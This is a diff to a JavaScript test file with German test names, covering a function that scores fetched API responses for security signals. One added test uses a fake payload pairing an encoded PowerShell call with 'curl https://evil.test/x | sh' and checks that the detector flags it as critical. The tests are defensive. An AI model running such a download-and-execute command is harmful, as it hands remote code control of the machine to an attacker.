@@ -66,7 +66,10 @@ test("Normales JSON wird als API-Antwort erkannt", async () => {
   assert.equal(result.securitySignals.responseType.kind, "JSON");
   assert.equal(result.securitySignals.responseType.status, "PASS");
   assert.equal(result.securitySignals.suspiciousPayload.status, "PASS");
+  assert.equal(result.securitySignals.threatIndicators.status, "NONE_DETECTED");
   assert.equal(result.securitySignals.redirects.status, "PASS");
+  assert.ok(result.securityObservation?.responseFingerprint);
+  assert.equal(result.securityObservation?.redirectTargets.length, 0);
 });
 
 test("HTML-Antwort wird als Warnung klassifiziert und nicht ausgeführt", async () => {
@@ -114,7 +117,26 @@ test("Verdächtige Script- und Shell-Muster bleiben Warnsignale", async () => {
 
   assert.equal(result.securitySignals.suspiciousPayload.status, "WARNING");
   assert.ok(result.securitySignals.suspiciousPayload.indicators.length >= 2);
+  assert.equal(result.securitySignals.threatIndicators.status, "SUSPICIOUS");
   assert.match(result.securitySignals.suspiciousPayload.summary, /kein Code ausgeführt/i);
+});
+
+test("Kombinierte ausführbare und Shell-Muster werden blockiert und hart gedeckelt", async () => {
+  const result = await runLiveVerification(
+    "https://service.example/payload",
+    "",
+    1000,
+    {},
+    "HTTP",
+    fakeFetcher("MZ\x00 powershell.exe -enc AAAA; curl https://evil.test/x | sh", {
+      "content-type": "application/octet-stream",
+    }),
+  );
+
+  assert.equal(result.securitySignals.threatIndicators.status, "FLAGGED");
+  assert.equal(result.securitySignals.threatIndicators.severity, "CRITICAL");
+  assert.equal(result.securitySignals.securityConfidence.score, 20);
+  assert.equal(result.securitySignals.securityConfidence.status, "FAIL");
 });
 
 test("TLS- und Header-Warnungen bleiben separat sichtbar", async () => {
@@ -169,4 +191,5 @@ test("Antwortinhalte und Secrets gelangen nicht in das Prüfergebnis", async () 
   );
 
   assert.doesNotMatch(JSON.stringify(result), new RegExp(secret));
+  assert.doesNotMatch(JSON.stringify(result.securityObservation), new RegExp(secret));
 });
